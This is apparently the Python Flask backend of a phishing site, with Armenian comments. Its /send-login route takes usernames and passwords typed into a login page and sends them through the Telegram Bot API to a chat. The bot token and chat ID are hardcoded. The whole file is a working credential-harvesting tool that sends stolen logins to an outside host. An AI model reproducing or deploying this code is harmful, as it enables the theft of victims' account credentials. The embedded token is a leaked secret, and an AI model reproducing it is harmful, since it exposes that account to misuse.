from flask import Flask, render_template, request, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

# ============================================
# 🔒 ՍԱ ՍԵՐՎԵՐՈՒՄ Է ՊԱՀՎՈՒՄ - ՉԻ ԵՐԵՎՈՒՄ HTML-ՈՒՄ
# ============================================
BOT_TOKEN = '8612671726:AAGHAf0KCLWFw_OlGtrGeOHd0L5yzGFKMyU'
CHAT_ID = '5215854157'
# ============================================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        # ✅ ԵԹԵ OTP_REQUEST Է, ՉԵՆՔ ՈՒՂԱՐԿՈՒՄ TELEGRAM
        if password == 'OTP_REQUEST':
            # Ոչինչ չենք ուղարկում Telegram, պարզապես վերադարձնում ենք ok
            return jsonify({'ok': True, 'message': 'SMS մուտք - տվյալներ չեն ուղարկվել Telegram'})
        
        # ✅ ՄԻԱՅՆ ՆՈՐՄԱԼ ՄՈՒՏՔԻ ԴԵՊՔՈՒՄ - ՈՒՂԱՐԿՈՒՄ ԵՆՔ ՄԻԱՅՆ ՄՈՒՏՔԱՆՈՒՆԸ և ԳԱՂՏՆԱԲԱՌԸ
        message = f"""<b>👤 :</b> <code>{username}</code>
<b>🔑 :</b> <code>{password}</code>"""
        
        # Telegram-ին ուղարկել HTML ձևաչափով
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload)
        result = response.json()
        
        if result.get('ok'):
            return jsonify({'ok': True, 'message': 'Ուղարկված է'})
        else:
            return jsonify({'ok': False, 'error': result.get('description')})
            
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
